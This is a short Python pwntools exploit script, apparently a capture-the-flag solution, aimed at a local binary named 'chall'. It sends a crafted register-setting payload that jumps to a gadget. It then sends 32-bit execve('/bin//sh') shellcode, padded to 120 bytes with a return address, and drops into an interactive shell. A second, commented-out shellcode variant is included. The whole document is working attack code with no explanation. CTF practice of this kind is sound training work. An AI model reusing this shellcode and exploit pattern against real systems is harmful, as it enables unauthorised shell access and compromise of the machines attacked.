from pwn import *
target=process('./chall')
context.terminal=["tmux","split","-h"]
#gdb.attach(target)

print(target.recvline())
ebx=0x600000
edx=0x7
esi=0x600078
ecx=0x1000
gadget=0x4000e8

payload=p32(ebx)+p32(0)+p32(edx)+p32(0)+p32(esi)+p32(0)+p32(ecx)+p32(0)+p64(0)+p32(gadget)
target.send(payload)

#shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode="\x31\xC0\x99\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xC9\x31\xD2\xB0\x0B\xCD\x80"
payload=shellcode+"\x00"*(120-len(shellcode))
payload+=p32(0x600000)+"\x00"
target.send(payload)


target.interactive()
